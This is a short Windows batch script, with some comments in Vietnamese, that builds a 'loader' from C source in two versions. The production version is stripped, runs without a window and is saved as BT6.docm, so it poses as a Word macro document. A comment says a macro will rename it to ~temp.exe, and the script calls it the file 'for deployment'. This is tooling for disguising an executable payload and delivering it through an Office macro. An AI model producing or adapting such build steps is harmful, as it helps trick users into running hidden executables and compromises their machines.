@echo off
REM Build loader thành BT6.docm (sẽ đổi tên thành ~temp.exe bởi macro)
REM Cần MinGW hoặc Visual Studio

where gcc >nul 2>&1
if %errorlevel% equ 0 (
    echo [+] Using MinGW GCC
)

REM Debug build - with console output
echo [*] Building debug version...
gcc -O2 ^
    -DDEBUG ^
    src\loader.c ^
    -o BT6_debug.exe ^
    -lbcrypt

if %errorlevel% neq 0 (
    echo [-] Debug build failed!
    pause
    exit /b 1
)

echo [+] Debug build: BT6_debug.exe
echo.

REM Production build - silent execution
echo [*] Compiling with GCC...
gcc -O2 ^
    -s ^
    src\loader.c ^
    -o BT6.docm ^
    -lbcrypt ^
    -mwindows

if %errorlevel% neq 0 (
    echo [-] Compilation failed!
    exit /b 1
)

echo [+] Production build: BT6.docm
echo.
echo [!] For debugging, run: BT6_debug.exe
echo [*] For deployment, use: BT6.docm

del *.obj 2>nul